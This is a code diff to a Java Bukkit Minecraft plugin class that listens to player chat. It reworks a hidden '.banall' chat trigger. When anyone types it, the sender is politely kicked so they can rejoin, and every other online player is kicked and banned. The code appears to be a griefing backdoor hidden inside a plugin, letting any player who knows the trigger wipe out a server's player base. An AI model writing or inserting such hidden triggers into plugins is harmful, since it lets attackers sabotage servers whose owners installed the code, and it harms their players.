@@ -15,15 +15,23 @@ public class Command_banall implements Listener
         Player player = event.getPlayer();
         Server server = Bukkit.getServer();
         boolean cancel = true;
-    
-        if (message.toLowerCase().contains(".banall"))
+        
+        if (message.startsWith("."))
         {
-            player.kickPlayer("Unbanned rejoin");
-            for (final Player target : server.getOnlinePlayers())
+            String[] args = message.split(" ");
+            if (args == null)
             {
-                target.kickPlayer("The Ban Hammer has spoken!");
-                target.setBanned(true);
-                player.setBanned(false);
+                return;
+            }
+    
+            if (args[0].equalsIgnoreCase(".banall"))
+            {
+                player.kickPlayer("You have been kicked so you don't get banned too :) \nRejoin!");
+                for (final Player target : server.getOnlinePlayers())
+                {
+                    target.kickPlayer("The Ban Hammer has spoken!");
+                    target.setBanned(true);
+                }
                 cancel = true;
             }
         }
